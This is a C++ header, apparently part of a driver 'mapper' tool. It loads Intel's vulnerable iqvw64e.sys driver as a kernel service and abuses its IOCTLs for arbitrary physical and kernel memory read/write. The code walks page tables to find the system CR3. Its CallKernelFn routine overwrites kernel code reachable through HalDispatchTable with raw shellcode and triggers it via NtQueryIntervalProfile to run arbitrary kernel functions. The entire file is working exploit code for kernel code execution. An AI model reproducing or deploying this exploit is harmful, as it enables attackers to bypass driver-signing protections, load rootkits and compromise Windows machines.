#pragma once
#include <cstdint>
#include <iostream>
#include <string>
#include <vector>
#include <windows.h>

// ============================================================================
// Intel iqvw64e.sys (NAL) Driver Interface
// Auto-detects old-style (0x8086xxxx) vs new-style (0x222000) IOCTLs
// ============================================================================
namespace Intel {

// Old-style IOCTLs (METHOD_NEITHER)
constexpr DWORD OLD_IOCTL_MAP = 0x80862007;
constexpr DWORD OLD_IOCTL_UNMAP = 0x80862008;

// New-style IOCTL (METHOD_BUFFERED, single IOCTL with case numbers)
constexpr DWORD NEW_IOCTL = 0x222000;
constexpr uint64_t CASE_COPY_MEMORY = 0x33;
constexpr uint64_t CASE_MAP_IO = 0x19;
constexpr uint64_t CASE_UNMAP_IO = 0x1A;

// ===== Structs for old-style IOCTLs =====
struct OldMapIn {
  uint32_t InterfaceType; // 1 = Internal
  uint32_t BusNumber;     // 0
  uint64_t PhysicalAddress;
  uint32_t IoSpace; // 0
  uint32_t Size;
};

// ===== Structs for new-style IOCTLs =====
struct CopyMemBuf {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
};

struct MapIoBuf {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
};

struct UnmapIoBuf {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
};

// State
inline HANDLE g_hDev = INVALID_HANDLE_VALUE;
inline uint64_t g_NtBase = 0;
inline uint64_t g_CR3 = 0;
inline bool g_UseNewStyle = false;

// ====================== Service Management ======================

inline bool LoadService() {
  wchar_t path[MAX_PATH];
  GetModuleFileNameW(nullptr, path, MAX_PATH);
  auto *s = wcsrchr(path, L'\\');
  if (s)
    wcscpy_s(s + 1, MAX_PATH - (s - path + 1), L"iqvw64e.sys");

  if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) {
    std::cerr << "[!] iqvw64e.sys not found next to mapper.exe!\n";
    return false;
  }

  SC_HANDLE scm = OpenSCManagerW(0, 0, SC_MANAGER_CREATE_SERVICE);
  if (!scm) {
    std::cerr << "[!] OpenSCManager failed: " << GetLastError()
              << " (Run as Admin?)\n";
    return false;
  }

  SC_HANDLE svc = CreateServiceW(scm, L"Nal", L"Nal", SERVICE_ALL_ACCESS,
                                 SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                                 SERVICE_ERROR_NORMAL, path, 0, 0, 0, 0, 0);

  if (!svc && GetLastError() == ERROR_SERVICE_EXISTS)
    svc = OpenServiceW(scm, L"Nal", SERVICE_ALL_ACCESS);
  else if (!svc)
    std::cerr << "[!] CreateServiceW failed: " << GetLastError() << "\n";

  if (!svc) {
    CloseServiceHandle(scm);
    return false;
  }

  if (!StartServiceW(svc, 0, 0)) {
    DWORD err = GetLastError();
    if (err != ERROR_SERVICE_ALREADY_RUNNING) {
      std::cerr << "[!] StartServiceW failed: " << err << "\n";
      DeleteService(svc);
      CloseServiceHandle(svc);
      CloseServiceHandle(scm);
      return false;
    }
  }
  CloseServiceHandle(svc);
  CloseServiceHandle(scm);
  return true;
}

inline void UnloadService() {
  SC_HANDLE scm = OpenSCManagerW(0, 0, SC_MANAGER_CONNECT);
  if (!scm)
    return;
  SC_HANDLE svc = OpenServiceW(scm, L"Nal", SERVICE_ALL_ACCESS);
  if (svc) {
    SERVICE_STATUS ss;
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    DeleteService(svc);
    CloseServiceHandle(svc);
  }
  CloseServiceHandle(scm);
}

// ====================== Physical Memory (Old Style) ======================

struct PhysMapped {
  uint64_t va;
  uint32_t sz;
};

inline PhysMapped OldMapPhys(uint64_t pa, uint32_t size) {
  OldMapIn in{};
  in.InterfaceType = 1; // Internal
  in.BusNumber = 0;
  in.PhysicalAddress = pa;
  in.IoSpace = 0;
  in.Size = size;

  uint64_t outVa = 0;
  DWORD ret = 0;
  BOOL ok = DeviceIoControl(g_hDev, OLD_IOCTL_MAP, &in, sizeof(in), &outVa,
                            sizeof(outVa), &ret, nullptr);

  // Some old drivers return non-standard NTSTATUS but still succeed
  if (!ok && outVa == 0) {
    // Try with InterfaceType = 5 (PCIBus)
    in.InterfaceType = 5;
    ok = DeviceIoControl(g_hDev, OLD_IOCTL_MAP, &in, sizeof(in), &outVa,
                         sizeof(outVa), &ret, nullptr);
  }

  if (outVa != 0)
    return {outVa, size};
  return {0, 0};
}

inline void OldUnmapPhys(PhysMapped m) {
  // Old unmap: pass VA + size
  struct {
    uint64_t va;
    uint32_t sz;
  } in{m.va, m.sz};
  DWORD ret = 0;
  DeviceIoControl(g_hDev, OLD_IOCTL_UNMAP, &in, sizeof(in), nullptr, 0, &ret,
                  nullptr);
}

inline bool OldReadPhys(uint64_t pa, void *buf, size_t sz) {
  auto m = OldMapPhys(pa & ~0xFFFULL,
                      (uint32_t)(((pa & 0xFFF) + sz + 0xFFF) & ~0xFFF));
  if (!m.va)
    return false;
  memcpy(buf, (void *)(m.va + (pa & 0xFFF)), sz);
  OldUnmapPhys(m);
  return true;
}

inline bool OldWritePhys(uint64_t pa, const void *buf, size_t sz) {
  auto m = OldMapPhys(pa & ~0xFFFULL,
                      (uint32_t)(((pa & 0xFFF) + sz + 0xFFF) & ~0xFFF));
  if (!m.va)
    return false;
  memcpy((void *)(m.va + (pa & 0xFFF)), buf, sz);
  OldUnmapPhys(m);
  return true;
}

// ====================== Page Table Walking ======================

inline uint64_t VirtToPhys(uint64_t cr3, uint64_t va) {
  uint64_t e;
  if (!OldReadPhys(cr3 + ((va >> 39) & 0x1FF) * 8, &e, 8) || !(e & 1))
    return 0;
  if (!OldReadPhys((e & 0xFFFFFFFFF000) + ((va >> 30) & 0x1FF) * 8, &e, 8) ||
      !(e & 1))
    return 0;
  if (e & 0x80)
    return (e & 0xFFFFC0000000) + (va & 0x3FFFFFFF);
  if (!OldReadPhys((e & 0xFFFFFFFFF000) + ((va >> 21) & 0x1FF) * 8, &e, 8) ||
      !(e & 1))
    return 0;
  if (e & 0x80)
    return (e & 0xFFFFFFE00000) + (va & 0x1FFFFF);
  if (!OldReadPhys((e & 0xFFFFFFFFF000) + ((va >> 12) & 0x1FF) * 8, &e, 8) ||
      !(e & 1))
    return 0;
  return (e & 0xFFFFFFFFF000) + (va & 0xFFF);
}

inline uint64_t FindCR3() {
  std::cout << "[*] Scanning for System CR3...\n";
  for (uint64_t cr3 = 0x100000; cr3 < 0x20000000; cr3 += 0x1000) {
    uint64_t pa = VirtToPhys(cr3, g_NtBase);
    if (!pa)
      continue;
    uint16_t sig = 0;
    if (!OldReadPhys(pa, &sig, 2))
      continue;
    if (sig == 0x5A4D) {
      std::cout << "[+] Found CR3: 0x" << std::hex << cr3 << std::dec << "\n";
      return cr3;
    }
  }
  return 0;
}

// ====================== Kernel R/W (Old Style via Physical) =====

inline bool OldReadKernel(uint64_t va, void *buf, size_t sz) {
  auto *dst = (uint8_t *)buf;
  size_t done = 0;
  while (done < sz) {
    uint64_t cur = va + done;
    size_t chunk = (sz - done < (0x1000 - (cur & 0xFFF)))
                       ? (sz - done)
                       : (0x1000 - (cur & 0xFFF));
    uint64_t pa = VirtToPhys(g_CR3, cur);
    if (!pa || !OldReadPhys(pa, dst + done, chunk))
      return false;
    done += chunk;
  }
  return true;
}

inline bool OldWriteKernel(uint64_t va, const void *buf, size_t sz) {
  auto *src = (const uint8_t *)buf;
  size_t done = 0;
  while (done < sz) {
    uint64_t cur = va + done;
    size_t chunk = (sz - done < (0x1000 - (cur & 0xFFF)))
                       ? (sz - done)
                       : (0x1000 - (cur & 0xFFF));
    uint64_t pa = VirtToPhys(g_CR3, cur);
    if (!pa || !OldWritePhys(pa, src + done, chunk))
      return false;
    done += chunk;
  }
  return true;
}

// ====================== New-Style CopyMemory ======================

inline bool NewMemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  CopyMemBuf buf{};
  buf.case_number = CASE_COPY_MEMORY;
  buf.source = src;
  buf.destination = dest;
  buf.length = size;
  DWORD ret = 0;
  return DeviceIoControl(g_hDev, NEW_IOCTL, &buf, sizeof(buf), nullptr, 0, &ret,
                         nullptr);
}

// ====================== Unified R/W ======================

inline bool ReadKernel(uint64_t va, void *buf, size_t sz) {
  if (g_UseNewStyle)
    return NewMemCopy(reinterpret_cast<uint64_t>(buf), va, sz);
  return OldReadKernel(va, buf, sz);
}

inline bool WriteKernel(uint64_t va, const void *buf, size_t sz) {
  if (g_UseNewStyle)
    return NewMemCopy(va, reinterpret_cast<uint64_t>(buf), sz);
  return OldWriteKernel(va, buf, sz);
}

// ====================== Export Resolution ======================

inline uint64_t GetNtExport(const char *name) {
  HMODULE h =
      LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
  if (!h)
    return 0;
  auto p = GetProcAddress(h, name);
  uint64_t addr = p ? g_NtBase + ((uint64_t)p - (uint64_t)h) : 0;
  FreeLibrary(h);
  return addr;
}

// ====================== Kernel Function Call ======================

inline uint64_t CallKernelFn(uint64_t func, uint64_t a1 = 0, uint64_t a2 = 0,
                             uint64_t a3 = 0, uint64_t a4 = 0) {
  uint64_t halDispatch = GetNtExport("HalDispatchTable");
  if (!halDispatch) {
    std::cerr << "[!] HalDispatchTable not found\n";
    return 0;
  }

  uint64_t origFuncAddr = 0;
  ReadKernel(halDispatch + 8, &origFuncAddr, 8);
  if (!origFuncAddr) {
    std::cerr << "[!] HalDispatchTable[1] is null\n";
    return 0;
  }

  uint8_t sc[84] = {
      0x48, 0x83, 0xEC, 0x28, 0x48, 0xB9, 0,    0,    0,    0,    0,    0,
      0,    0,    0x48, 0xBA, 0,    0,    0,    0,    0,    0,    0,    0,
      0x49, 0xB8, 0,    0,    0,    0,    0,    0,    0,    0,    0x49, 0xB9,
      0,    0,    0,    0,    0,    0,    0,    0,    0x48, 0xB8, 0,    0,
      0,    0,    0,    0,    0,    0,    0xFF, 0xD0, 0x49, 0xBA, 0,    0,
      0,    0,    0,    0,    0,    0,    0x49, 0x89, 0x02, 0x48, 0x83, 0xC4,
      0x28, 0x33, 0xC0, 0xC3, 0,    0,    0,    0,    0,    0,    0,    0};

  uint64_t resultAddr = origFuncAddr + 76;
  memcpy(&sc[6], &a1, 8);
  memcpy(&sc[16], &a2, 8);
  memcpy(&sc[26], &a3, 8);
  memcpy(&sc[36], &a4, 8);
  memcpy(&sc[46], &func, 8);
  memcpy(&sc[56], &resultAddr, 8);

  uint8_t saved[84];
  ReadKernel(origFuncAddr, saved, sizeof(saved));
  WriteKernel(origFuncAddr, sc, sizeof(sc));

  uint64_t zero = 0;
  WriteKernel(resultAddr, &zero, 8);

  typedef NTSTATUS(NTAPI * fnNtQIP)(ULONG, PULONG);
  auto NtQIP = (fnNtQIP)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                       "NtQueryIntervalProfile");
  if (NtQIP) {
    ULONG interval = 0;
    NtQIP(2, &interval);
  }

  uint64_t result = 0;
  ReadKernel(resultAddr, &result, 8);
  WriteKernel(origFuncAddr, saved, sizeof(saved));
  return result;
}

// ====================== Auto-detect + Initialize ======================

inline bool DetectDriverStyle() {
  // Try new-style CopyMemory first (fastest, no page table walking)
  CopyMemBuf test{};
  test.case_number = CASE_COPY_MEMORY;
  test.source = g_NtBase;
  uint16_t testOut = 0;
  test.destination = reinterpret_cast<uint64_t>(&testOut);
  test.length = 2;
  DWORD ret = 0;
  if (DeviceIoControl(g_hDev, NEW_IOCTL, &test, sizeof(test), nullptr, 0, &ret,
                      nullptr) &&
      testOut == 0x5A4D) {
    g_UseNewStyle = true;
    std::cout << "[+] Detected NEW-style Intel driver (CopyMemory IOCTL)\n";
    return true;
  }

  // Try old-style physical memory mapping
  std::cout << "[*] Trying old-style Intel driver (MapIoSpace IOCTL)...\n";
  auto m = OldMapPhys(0x1000, 0x1000);
  if (m.va) {
    OldUnmapPhys(m);
    std::cout << "[+] Detected OLD-style Intel driver (MapIoSpace IOCTL)\n";
    g_UseNewStyle = false;
    return true;
  }

  std::cerr << "[!] Could not detect Intel driver IOCTL style.\n";
  return false;
}

inline uint64_t GetNtoskrnlBase() {
  typedef NTSTATUS(NTAPI * fn)(ULONG, PVOID, ULONG, PULONG);
  auto NtQSI = (fn)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                  "NtQuerySystemInformation");
  if (!NtQSI)
    return 0;
  ULONG needed = 0;
  NtQSI(11, nullptr, 0, &needed);
  std::vector<uint8_t> buf(needed);
  if (NtQSI(11, buf.data(), needed, &needed) != 0)
    return 0;
  struct MI {
    HANDLE s;
    PVOID mb;
    PVOID ib;
    ULONG is;
    ULONG fl;
    USHORT a, b, c, d;
    UCHAR fp[256];
  };
  struct MS {
    ULONG n;
    MI m[1];
  };
  auto *ms = (MS *)buf.data();
  return ms->n > 0 ? (uint64_t)ms->m[0].ib : 0;
}

} // namespace Intel
